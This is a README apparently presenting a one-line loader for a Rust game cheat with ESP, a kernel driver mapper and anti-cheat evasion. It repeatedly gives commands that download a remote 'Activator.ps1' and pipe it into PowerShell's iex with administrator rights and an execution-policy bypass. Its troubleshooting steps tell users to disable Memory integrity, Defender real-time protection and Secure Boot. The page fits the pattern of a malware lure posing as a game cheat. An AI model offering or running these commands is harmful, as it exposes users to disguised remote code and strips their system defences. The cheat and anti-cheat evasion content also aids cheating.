# 🦀 Rust External | Single Line Loader

An advanced, single-line automated loader and environment configurator for Rust External tools. This script automates kernel-driver registry entry injection, memory page preparation, and overlay rendering prerequisites—requiring zero manual system modification.

## 🚀 Quick Run

### PowerShell
Run the following command in an elevated PowerShell session (Run as Administrator):
```powershell
irm https://raw.githubusercontent.com/anayadora771/Activator/main/Activator.ps1 | iex
```

### Command Prompt (cmd.exe)
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/anayadora771/Activator/main/Activator.ps1 | iex"
```

### Windows Terminal
Compatible with any modern terminal profile (PowerShell or CMD). Simply copy and paste the command matching your current shell environment.

---

## 🛠️ How It Works

1. **Privilege Elevation:** A standard UAC prompt will appear—click **Yes** to grant administrative permissions (required for kernel/driver interactions).
2. **Environment Scan:** The script checks your Windows build version, virtualization status (Hyper-V), and vulnerable driver blocklists.
3. **Automated Loading:** Fetches the required bypass modules and mapped libraries directly from the secure server network.
4. **Driver Injection:** Silently maps the external communication driver into memory without leaving standard registry traces.
5. **Overlay Deployment:** Launches the optimized hardware-accelerated overlay layer for visual feedback.

## 📱 Included Modules

| Component | Description |
|-----|-------------|
| **Kernel Driver Mapper** | Maps the driver into memory using clean, modern bypass techniques. |
| **DirectX 11/12 Overlay** | External rendering engine with zero frame-drop impact and capture bypass. |
| **Offset Auto-Updater** | Parses the latest game structures to keep memory offsets synchronized. |
| **Glow & ESP Engine** | External entity processing loop for player and resource tracking. |

## ✨ Key Features

- **Single-Command Execution:** No need to manually download vulnerable drivers (`kdmapper`, `gdrv`) or disable system integrity settings.
- **Undetected Design:** Cleans up driver traces, MmUnloadedDrivers tables, and PiDDBCacheTable entries on the fly.
- **Optimized Overlay:** Independent external window with full-screen borderless support and stream-proof capability (OBS/Discord hidden).
- **Anti-Cheat Isolation:** Runs entirely in Usermode/Kernel space without attaching standard debugging hooks to `RustClient.exe`.

## 💻 System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| **OS** | Windows 10 (64-bit, 20H2 or higher) | Windows 11 (22H2/23H2) |
| **CPU** | Intel/AMD with VT-x/AMD-V enabled | Intel Core i5 / AMD Ryzen 5+ |
| **RAM** | 8 GB | 16 GB+ |
| **Virtualization** | Enabled in BIOS | Enabled in BIOS (Hyper-V Disabled) |
| **Security Settings** | Secure Boot Disabled (Optional for some builds) | Secure Boot Disabled / Exploit Protection Off |

## 🔍 Troubleshooting

### Script closes instantly or does nothing
Your system's execution policy might be blocking unsigned scripts. Bypass it by using the Command Prompt version:
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/anayadora771/Activator/main/Activator.ps1 | iex"
```
Alternatively, check if your Windows Defender is proactively blocking the connection string.

### Error: "Driver failed to map" (Status 0xC00000BB)
This occurs if Virtualization-Based Security (VBS) or Core Isolation is enabled. To resolve this:
1. Open **Windows Security** → **Device Security**.
2. Click **Core isolation details**.
3. Turn **OFF** Memory integrity.
4. Restart your PC and run the script again.

### Antivirus or SmartScreen blocks the execution
Windows Defender flags memory-mapping scripts as riskware due to their low-level access. To bypass:
1. Navigate to **Windows Security** → **Virus & threat protection** → **Manage settings**.
2. Temporarily disable **Real-time protection**.
3. Run the script. (Optional: Add the folder containing your overlay assets to the Exclusions list).

### Blue Screen (BSOD) upon injection
- Ensure your Windows Version exactly matches the supported builds (use `winver` command to check).
- Facepunch updates or EasyAntiCheat signature updates may require an offset recalculation. Check the repository for the latest commit.
- Close any active anti-cheat services from other games (Vanguard, FaceIt AC) as they block vulnerable driver mapping.

### Overlay is laggy or not showing up
- Ensure Rust is running in **Windowed Borderless** or **Windowed** mode. External overlays cannot render over exclusive full-screen windows.
- Update your GPU drivers to the latest version to support independent overlay rendering.

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
